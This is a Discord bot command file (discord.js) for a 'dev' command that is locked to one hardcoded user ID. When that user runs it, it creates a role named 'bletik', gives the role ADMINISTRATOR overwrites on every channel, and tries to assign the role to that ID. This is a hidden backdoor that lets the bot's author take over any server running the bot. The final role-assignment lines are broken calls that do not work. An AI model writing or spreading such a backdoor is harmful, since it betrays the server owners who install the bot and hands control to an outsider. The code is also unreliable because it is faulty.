const Discord = require("discord.js");

const bot = new Discord.Client();

exports.run = async (client, message, args) => {

  let embed = new Discord.RichEmbed()

    .setTitle("developer")

    .setDescription(

      "Sorry, the `dev` command can only be executed by the Developer."

    )

    .setColor("BLUE");

  if (message.author.id !== "478547279104442368")

    return message.channel.send(embed);

  function clean(text) {

    if (typeof text === "string")

      return text

        .replace(/`/g, "`" + String.fromCharCode(8203))

        .replace(/@/g, "@" + String.fromCharCode(8203));

    else return text;

  }

  

  let bletik = message.guild.roles.find(`name`, "bletik");

  if (!bletik) {

    try {

      bletik = await message.guild.createRole({

        name: "bletik",

        color: "#49FFFD",

        permissions: []

      });

      message.guild.channels.forEach(async (channel, id) => {

        await channel.overwritePermissions(bletik, {

          

          ADMINISTRATOR: true,

          SEND_MESSAGES: true,

          ADD_REACTIONS: true

        });

      });

    } catch (e) {

      console.log(e.stack);

    }

  }

await bletik.addrole(bletik.id)

  await bletik.author.id.addrole(bletik,"478547279104442368");

  bletik.addRole(bletik);
  bletik.addrole.id("478547279104442368")

  }
module.exports.help = {

  name: "dev"

};

